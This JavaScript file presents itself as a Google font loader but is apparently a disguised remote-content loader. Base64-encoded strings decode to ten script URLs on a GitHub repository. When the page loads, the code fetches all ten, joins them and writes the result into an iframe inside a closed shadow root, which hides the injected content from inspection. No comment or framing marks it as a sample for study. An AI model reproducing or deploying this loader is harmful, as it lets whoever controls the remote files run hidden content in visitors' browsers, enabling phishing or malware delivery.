const googlefontface_loa_enc = [
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwMC5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwMS5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwMi5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwMy5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwNC5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwNS5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwNi5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwNy5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwOC5qcw==",
  "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hc3Rlckluc3BlY3Rvci9JbnNwZWN0b3IvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL2ZvbnQwOS5qcw=="
];

const ChromeMozilla = googlefontface_loa_enc.map(str => atob(str));

async function googlefontface_loa_fil(files) {
  let htmlContent = '';

  for (const file of files) {
    try {
      const res = await fetch(file);
      const text = await res.text();
      htmlContent += text + '\n';
    } catch (err) {
      htmlContent += `<!-- Failed to load ${file} -->\n`;
    }
  }

  return htmlContent;
}

async function createShadowIframe(files) {
  const host = document.getElementById('host');
  const shadowRoot = host.attachShadow({ mode: 'closed' });

  const wrapper = document.createElement('div');
  wrapper.style.cssText = 'width:100%;height:100%;';

  const iframe = document.createElement('iframe');
  iframe.style.cssText = 'border:0;width:100%;height:100%;';

  wrapper.appendChild(iframe);
  shadowRoot.appendChild(wrapper);

  const assembledHTML = await googlefontface_loa_fil(files);

  const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
  iframeDoc.open();
  iframeDoc.write(assembledHTML);
  iframeDoc.close();
}

createShadowIframe(ChromeMozilla);